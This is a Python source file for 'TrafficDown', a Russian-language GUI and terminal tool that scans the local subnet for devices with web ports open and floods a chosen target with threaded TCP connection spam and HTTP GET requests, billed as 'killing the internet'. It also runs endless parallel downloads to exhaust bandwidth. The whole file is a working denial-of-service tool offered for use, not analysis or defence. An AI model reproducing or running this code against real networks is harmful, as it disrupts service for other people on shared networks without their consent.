import os
import time
import sys
import importlib.util
import socket
import threading
import requests
import random
import string
from urllib.parse import urlparse
import colorama
from colorama import Fore, init
import subprocess
import json
import urllib3
from servers.servers import get_all_urls, get_provider_urls, get_providers_list, get_sorted_urls

# Отключаем предупреждения о незащищенных HTTP соединениях
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init()

packages = ["requests", "threading", "customtkinter", 'socket', 'colorama', 'psutil']
for package in packages:
    installed = importlib.util.find_spec(package)
    if not installed:
        os.system(f"python -m pip install {package}")

try:
    import customtkinter
    from customtkinter import CTk, CTkEntry, CTkButton, CTkLabel, CTkFrame, set_appearance_mode, CTkTextbox
    use_gui = True
except ImportError:
    use_gui = False
    print(f'{Fore.RED}Не удалось загрузить GUI. Используем терминальную версию.{Fore.WHITE}')
    time.sleep(2)

LOGO = '''████████╗██████╗░░█████╗░███████╗███████╗██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗███╗░░██╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║████╗░██║
░░░██║░░░██████╔╝███████║█████╗░░█████╗░░██║██║░░╚═╝██║░░██║██║░░██║░╚██╗████╗██╔╝██╔██╗██║
░░░██║░░░██╔══██╗██╔══██║██╔══╝░░██╔══╝░░██║██║░░██╗██║░░██║██║░░██║░░████╔═████║░██║╚████║
░░░██║░░░██║░░██║██║░░██║██║░░░░░██║░░░░░██║╚█████╔╝██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚═╝░╚════╝░╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝'''

LOGO_WIDTH = 91

class NetworkStresser:
    def __init__(self):
        self.running = False
        self.threads = []
        self.total_bytes = 0
        self.ports = [80, 443, 8080, 8443]
        self.eat = False
        self.killwifi = False
        self.readed = 0
        self.max_threads = 50
        self.active_downloads = 0
        self.lock = threading.Lock()
        self.urls = []  
        
    def generate_random_data(self, size=1024):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
    
    def scan_network(self):
        try:
            # Получаем локальный IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Определяем сеть
            network = '.'.join(local_ip.split('.')[:-1])
            clients = []
            
            print(f"{Fore.YELLOW}[*] Сканируем сеть {network}.0/24...{Fore.WHITE}")
            
            def check_host(ip):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    s.connect((ip, 80))
                    s.close()
                    clients.append({'ip': ip, 'ports': [80]})
                except:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.1)
                        s.connect((ip, 443))
                        s.close()
                        clients.append({'ip': ip, 'ports': [443]})
                    except:
                        pass
            
            # Мультипоточное сканирование
            threads = []
            for i in range(1, 255):
                ip = f"{network}.{i}"
                t = threading.Thread(target=check_host, args=(ip,))
                t.daemon = True
                threads.append(t)
                t.start()
            
            # Ожидаем когда просканится
            for t in threads:
                t.join()
            
            return clients, local_ip
            
        except Exception as e:
            print(f"{Fore.RED}[-] Ошибка сканирования: {e}{Fore.WHITE}")
            return [], None

    def connection_flood(self, target_ip, port):
        """Флуд соединениями без root прав"""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, port))
                s.send(self.generate_random_data())
                time.sleep(0.1)  # немного задержка чтобы телефон не рванул
                s.close()
            except:
                pass

    def http_flood(self, target_ip):
        """HTTP флуд без root прав"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        while self.running:
            try:
                for port in [80, 443]:
                    protocol = 'https' if port == 443 else 'http'
                    url = f"{protocol}://{target_ip}"
                    requests.get(url, headers=headers, timeout=1, verify=False)
            except:
                pass

    def start_network_flood(self, target_ip):
        """Запуск атаки без root прав"""
        self.running = True
        
        # спам соединениями
        for port in self.ports:
            for _ in range(5):
                t = threading.Thread(target=self.connection_flood, args=(target_ip, port))
                t.daemon = True
                t.start()
                self.threads.append(t)
        
        # HTTP флуд
        for _ in range(10):
            t = threading.Thread(target=self.http_flood, args=(target_ip,))
            t.daemon = True
            t.start()
            self.threads.append(t)

    def stop_network_flood(self):
        self.running = False
        time.sleep(1)

    def scan_and_attack(self):
        print(f"{Fore.YELLOW}[*] Сканируем сеть...{Fore.WHITE}")
        clients, local_ip = self.scan_network()
        
        if not clients:
            print(f"{Fore.RED}[-] Устройства не найдены{Fore.WHITE}")
            return
        
        print(f"\n{Fore.GREEN}Доступные устройства:{Fore.WHITE}")
        for i, client in enumerate(clients, 1):
            ports_str = ", ".join(map(str, client['ports']))
            print(f"{i}. IP: {client['ip']}\tОткрытые порты: {ports_str}")
        
        choice = input(f"\n{Fore.CYAN}Выберите цель (номер устройства): {Fore.WHITE}")
        try:
            target = clients[int(choice)-1]
            print(f"\n{Fore.YELLOW}[*] Атакуем {target['ip']}...{Fore.WHITE}")
            
            self.start_network_flood(target['ip'])
            
            input(f"\n{Fore.RED}Нажмите Enter для остановки...{Fore.WHITE}")
            self.stop_network_flood()
            
        except (IndexError, ValueError):
            print(f"{Fore.RED}[-] Неверный выбор!{Fore.WHITE}")
    
    def traffic_down(self):
        print(f"{Fore.YELLOW}[*] Тестируем скорость серверов...{Fore.WHITE}")
        try:
            self.urls = get_sorted_urls()
            if not self.urls:
                print(f"{Fore.RED}[-] Нет доступных серверов!{Fore.WHITE}")
                return
                
            print(f"{Fore.GREEN}[+] Найдено {len(self.urls)} рабочих серверов{Fore.WHITE}")
            self.eat = True
            self.readed = 0
            self.active_downloads = 0
            
            def manage_downloads():
                while self.eat:
                    with self.lock:
                        if self.active_downloads < self.max_threads:
                            needed = self.max_threads - self.active_downloads
                            available_urls = self.urls[:needed]
                            if available_urls:
                                for url in available_urls:
                                    threading.Thread(target=self.download_thread, args=(url,), daemon=True).start()
                                    self.active_downloads += 1
                    time.sleep(1)
            
            threading.Thread(target=manage_downloads, daemon=True).start()
            
            if not use_gui:
                input(f"\n{Fore.YELLOW}Нажмите ENTER для остановки{Fore.WHITE}")
                self.eat = False
                
        except Exception as e:
            print(f"{Fore.RED}[-] Ошибка при тестировании скорости серверов: {e}{Fore.WHITE}")
    
    def download_thread(self, url):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
            
            response = requests.get(url, headers=headers, stream=True, verify=False)
            chunk_size = 1024 * 1024  # 1MB chunks
            last_update = time.time()
            
            while self.eat:
                for chunk in response.iter_content(chunk_size=chunk_size):
                    if not self.eat:
                        break
                    self.readed += len(chunk)
                    
                    current_time = time.time()
                    if current_time - last_update >= 1:
                        speed = self.readed / (current_time - last_update) / (1024 * 1024)  # MB/s
                        text = f'Скачано: {self.readed / (1024 * 1024 * 1024):.2f} GB | Скорость: {speed:.2f} MB/s | Потоков: {self.active_downloads}'
                        print(f'\r{Fore.GREEN}{text}{Fore.WHITE}', end='', flush=True)
                        if use_gui:
                            self.statuslbl.configure(text=text)
                        last_update = current_time
                        
                response = requests.get(url, headers=headers, stream=True, verify=False)
                
        except Exception as e:
            print(f"\n{Fore.RED}[-] Ошибка в потоке: {e}{Fore.WHITE}")
        finally:
            self.active_downloads -= 1
    
    def kill_wifi(self):
        print(f"{Fore.YELLOW}[*] Запускаем сканирование сети...{Fore.WHITE}")
        self.scan_and_attack()

def print_logo(x):
    if x >= LOGO_WIDTH:
        spaces = " " * (x//2 - LOGO_WIDTH//2)
        for line in LOGO.split("\n"):
            print(f"{Fore.WHITE}{spaces}{line}")
    else:
        text = f"{Fore.WHITE}(увеличь окно или уменьши размер текста)"
        print(" " * (x//2 - len(text)//2) + text)

def main():
    global x, y
    stresser = NetworkStresser()
    
    if use_gui:
        window = CTk()
        window.resizable(False, False)
        set_appearance_mode("dark")
        window.protocol("WM_DELETE_WINDOW", lambda: os._exit(0))
        window.title('TrafficDown | by Sonys9')
        window.geometry('400x300')
        
        def add_widgets():
            global startbtn, statuslbl, killwifibtn
            screen_width = window.winfo_width()
            screen_height = window.winfo_height()
            
            CTkFrame(window, width=screen_width-20, height=screen_height-20).place(x=10, y=10)
            
            statuslbl = CTkLabel(window, text='Готов к работе', font=('Arial Black', 13), bg_color='#2B2B2B', wraplength=350)
            statuslbl.place(relx=0.5, anchor='center', rely=0.25)
            stresser.statuslbl = statuslbl
            
            def show_credits():
                credits_window = CTk()
                credits_window.title('Credits')
                credits_window.geometry('300x200')
                credits_window.resizable(False, False)
                
                CTkLabel(credits_window, text='TrafficDown Credits', 
                        font=('Arial Black', 16), bg_color='#2B2B2B').pack(pady=10)
                
                CTkLabel(credits_window, text='Main Developer:', 
                        font=('Arial Black', 12), bg_color='#2B2B2B').pack(pady=5)
                CTkLabel(credits_window, text='Github @Sonys9\nTikTok @взломщик\nTelegram @freedomleaker2', 
                        font=('Arial Black', 10), bg_color='#2B2B2B').pack()
                
                CTkLabel(credits_window, text='\nMulti-threading & Server System:', 
                        font=('Arial Black', 12), bg_color='#2B2B2B').pack(pady=5)
                CTkLabel(credits_window, text='Github @cryptexctl\nTelegram @systemxpore', 
                        font=('Arial Black', 10), bg_color='#2B2B2B').pack()
                
                credits_window.mainloop()
            
            def show_changelog():
                try:
                    with open('changelog/changelog.txt', 'r', encoding='utf-8') as f:
                        changelog_text = f.read()
                except Exception as e:
                    changelog_text = f"Ошибка чтения changelog: {e}"
                
                changelog_window = CTk()
                changelog_window.title('Changelog')
                changelog_window.geometry('400x500')
                changelog_window.resizable(False, False)
                
                CTkLabel(changelog_window, text='TrafficDown Changelog', 
                        font=('Arial Black', 16), bg_color='#2B2B2B').pack(pady=10)
                
                text_widget = CTkTextbox(changelog_window, width=380, height=400, bg_color='#2B2B2B')
                text_widget.pack(pady=10)
                text_widget.insert('1.0', changelog_text)
                text_widget.configure(state='disabled')
                
                changelog_window.mainloop()
            
            credits_btn = CTkButton(window, text='Credits', command=show_credits,
                                  fg_color='#2B2B2B', bg_color='#2B2B2B', hover_color='#333333',
                                  width=80, height=25)
            credits_btn.place(x=screen_width-100, y=screen_height-40)
            
            changelog_btn = CTkButton(window, text='Changelog', command=show_changelog,
                                    fg_color='#2B2B2B', bg_color='#2B2B2B', hover_color='#333333',
                                    width=80, height=25)
            changelog_btn.place(x=screen_width-190, y=screen_height-40)
            
            startbtn = CTkButton(window, text='Есть трафик', command=start_eat_ctkinter, 
                               fg_color='#008E63', bg_color='#2B2B2B', hover_color='#225244')
            startbtn.place(relx=0.5, anchor='center', rely=0.55)
            
            killwifibtn = CTkButton(window, text='Убить интернет', 
                                  command=lambda: threading.Thread(target=start_kill_ctkinter).start(),
                                  fg_color='#008E63', bg_color='#2B2B2B', hover_color='#225244')
            killwifibtn.place(relx=0.5, anchor='center', rely=0.75)
        
        def start_eat_ctkinter():
            if stresser.eat:
                startbtn.configure(text='Есть трафик')
                stresser.statuslbl.configure(text='Готов к работе')
                stresser.eat = False
            else:
                startbtn.configure(text='Остановить')
                stresser.statuslbl.configure(text='Тестируем сервера...')
                stresser.eat = True
                threading.Thread(target=stresser.traffic_down, daemon=True).start()
        
        def start_kill_ctkinter():
            if stresser.killwifi:
                killwifibtn.configure(text='Убить интернет')
                stresser.statuslbl.configure(text='Готов к работе')
                stresser.killwifi = False
            else:
                killwifibtn.configure(text='Остановить')
                stresser.statuslbl.configure(text='Сканируем сеть...')
                stresser.killwifi = True
                threading.Thread(target=stresser.kill_wifi, daemon=True).start()
        
        window.after(200, add_widgets)
        window.mainloop()
    else:
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            
            size = os.get_terminal_size()
            x, y = size.columns, size.lines
            
            print_logo(x)
            
            functions = [
                {'name': 'traffic', 'description': 'начать съедание трафика', 'handler': stresser.traffic_down},
                {'name': 'wifikill', 'description': 'убить интернет', 'handler': stresser.kill_wifi},
                {'name': 'exit', 'description': 'выход', 'handler': lambda: os._exit(0)}
            ]
            
            for function in functions:
                text = f"{Fore.WHITE}[{Fore.CYAN}{function['name']}{Fore.WHITE}] - {function['description']}"
                print(" " * (x//2 - len(text)//2 + 6) + text)
            
            text = "Введите название функции:\t"
            choice = input(" " * (x//2 - len(text)//2) + text + Fore.GREEN)
            
            for function in functions:
                if function['name'] == choice.lower().strip():
                    function['handler']()
                    break

if __name__ == "__main__":
    main() 